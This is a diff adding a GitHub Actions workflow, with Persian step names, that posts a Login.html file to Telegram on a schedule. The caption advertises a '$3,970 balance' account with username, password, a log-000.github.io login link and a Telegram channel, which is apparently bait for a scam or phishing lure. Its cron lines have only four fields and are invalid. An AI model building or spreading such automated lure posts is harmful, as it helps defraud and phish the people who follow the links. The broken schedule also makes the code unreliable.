@@ -1,0 +1,25 @@
+name: ارسال پیام + فایل HTML به تلگرام
+
+on:
+  schedule:
+    - cron: '21 * * *'   # ۴ بعد از ظهر آمریکا
+    - cron: '02 * * *'   # ۹ شب آمریکا
+  
+  workflow_dispatch:
+
+jobs:
+  send-telegram:
+    runs-on: ubuntu-latest
+    steps:
+      - name: دریافت کدها از گیت‌هاب
+        uses: actions/checkout@v4
+
+      - name: ارسال فایل HTML با توضیح
+        env:
+          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
+          CHAT_ID: ${{ secrets.CHAT_ID }}
+        run: |
+          curl -s -F document=@Login.html \
+          -F chat_id=${CHAT_ID} \
+          -F caption="balance: 3,970$%0Ausername: john371%0Apassword: 2525561%0A%0ALogin: https://log-000.github.io/%0Ahttps://t.me/illuminati300/36" \
+          https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
